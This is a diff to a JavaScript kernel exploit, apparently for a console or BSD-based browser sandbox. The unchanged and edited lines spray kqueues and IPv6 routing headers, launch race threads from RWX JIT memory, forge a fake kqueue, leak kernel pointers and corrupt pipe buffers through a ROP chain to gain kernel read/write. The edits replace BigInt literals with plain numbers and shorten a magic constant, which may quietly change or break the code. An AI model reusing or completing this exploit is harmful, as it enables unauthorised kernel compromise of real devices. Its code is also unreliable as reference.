@@ -18,7 +18,7 @@ fn.register(
   0x16b,
   "kevent",
   ["bigint", "bigint", "number", "bigint", "number", "bigint"],
-  "bigint",
+  "bigint"
 );
 
 const kqueue = fn.kqueue;
@@ -42,8 +42,8 @@ if (typeof ipv6_socks === "undefined" || ipv6_socks.length === 0) {
 }
 free_rthdrs(ipv6_socks);
 
-let master_r_pipe_data = 0n,
-  victim_r_pipe_data = 0n;
+let master_r_pipe_data = [0, 0],
+  victim_r_pipe_data = [0, 0];
 let master_pipe = [0, 0],
   victim_pipe = [0, 0];
 
@@ -69,15 +69,15 @@ function create_race_thread(fd) {
   const codeBuf = malloc(code.length);
   for (let i = 0; i < code.length; i++) write8(codeBuf.add(i), code[i]);
   const handle = jitshm_create(0, code.length, 0x7);
-  const exec = mmap(0n, code.length, 0x7, 0x11, handle, 0);
+  const exec = mmap(0, code.length, 0x7, 0x11, handle, 0);
   for (let i = 0; i < code.length; i++) write8(exec.add(i), code[i]);
   const args = malloc(0x68);
   write64(args.add(0x00), exec);
-  write64(args.add(0x08), 0n);
+  write64(args.add(0x08), 0);
   write64(args.add(0x10), malloc(0x1000));
-  write64(args.add(0x18), 0x1000n);
+  write64(args.add(0x18), 0x1000);
   write64(args.add(0x20), malloc(0x40));
-  write64(args.add(0x28), 0x40n);
+  write64(args.add(0x28), 0x40);
   const tid = malloc(8);
   write64(args.add(0x30), tid);
   write64(args.add(0x38), malloc(8));
@@ -90,7 +90,7 @@ function create_race_thread(fd) {
 function spray_fake_kq_prefix(rop_addr) {
   const partial = malloc(0x40); // 64 bytes
   for (let i = 0; i < 0x40; i++) write8(partial.add(i), 0);
-  write64(partial.add(0x38), 0x1337cafebaben); // magic at offset 56
+  write64(partial.add(0x38), 0x1337); // magic at offset 56
 
   const rhBuf = malloc(0x40);
   for (let i = 0; i < 0x40; i++) write8(rhBuf.add(i), read8(partial.add(i)));
@@ -108,7 +108,7 @@ function spray_fake_kq_prefix(rop_addr) {
 
 // ─── Leak kq_fdp and kl_lock from the corrupted kqueue ───────────
 function leak_kq_info() {
-  const magic = 0x1337cafebaben;
+  const magic = 0x1337;
   const buf = malloc(KQ_SIZE);
   for (let i = 0; i < ipv6_socks.length; i++) {
     get_rthdr(ipv6_socks[i], buf, KQ_SIZE);
@@ -160,7 +160,7 @@ function corrupt_pipe() {
   const spray_fds = [];
   for (let i = 0; i < SPRAY_COUNT; i++) {
     const f = kqueue();
-    if (!f.eq(-1n)) spray_fds.push(Number(f.lo));
+    if (!f.eq(-1)) spray_fds.push(Number(f.lo));
   }
   // 3. Race
   create_race_thread(orig);
@@ -191,7 +191,7 @@ function corrupt_pipe() {
   write16(kev.add(0x0a), 0x0001); // EV_ADD
   write16(kev.add(0x08), -1); // filter (unused)
   write64(kev.add(0x18), rop); // udata -> ROP chain
-  kevent(new BigInt(dupFd), kev, 1, 0n, 0, 0n);
+  kevent(new BigInt(dupFd), kev, 1, 0, 0, 0);
   // Now master pipe buffer points to victim pipe data → arbitrary read/write via pipe fds
   log("[+] Pipe corruption done, kernel R/W active");
 }
@@ -255,7 +255,7 @@ function run_exploit() {
   const spray1 = [];
   for (let i = 0; i < SPRAY_COUNT; i++) {
     const f = kqueue();
-    if (!f.eq(-1n)) spray1.push(Number(f.lo));
+    if (!f.eq(-1)) spray1.push(Number(f.lo));
   }
   create_race_thread(f1);
   create_race_thread(f2);
